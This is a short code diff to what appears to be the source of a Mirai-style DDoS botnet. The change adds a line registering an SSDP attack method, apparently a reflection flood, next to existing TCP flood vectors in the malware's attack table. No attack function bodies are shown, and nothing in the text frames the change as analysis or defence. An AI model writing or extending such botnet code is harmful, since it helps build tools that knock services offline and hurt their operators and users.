@@ -58,6 +58,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_TCPALL, (ATTACK_FUNC)attack_method_tcpall);
     add_attack(ATK_VEC_TCPFRAG, (ATTACK_FUNC)attack_method_tcpfrag);
     add_attack(ATK_VEC_ASYN, (ATTACK_FUNC)attack_method_asyn);
+    add_attack(ATK_VEC_SSDP, (ATTACK_FUNC)attack_method_ssdp);
     add_attack(ATK_VEC_AUTOBYPASS, (ATTACK_FUNC)attack_autobypass);
     return TRUE;
 }
